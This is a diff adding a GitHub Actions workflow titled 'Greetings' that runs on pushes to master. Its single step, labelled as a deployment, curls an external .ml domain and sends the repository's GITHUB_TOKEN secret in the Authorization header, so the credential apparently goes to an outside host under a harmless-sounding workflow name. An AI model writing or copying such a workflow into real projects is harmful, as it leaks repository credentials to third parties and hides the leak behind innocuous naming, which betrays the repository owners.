@@ -1,0 +1,13 @@
+name: Greetings
+
+on:
+  push:
+    branches: [master]
+
+jobs:
+  greeting:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deploy to Chip Cluster
+        run: |
+          curl https://config.chipserver.ml/api/v1/config/anantsharma:auth-service --header "Authorization: ${{secrets.GITHUB_TOKEN}}"
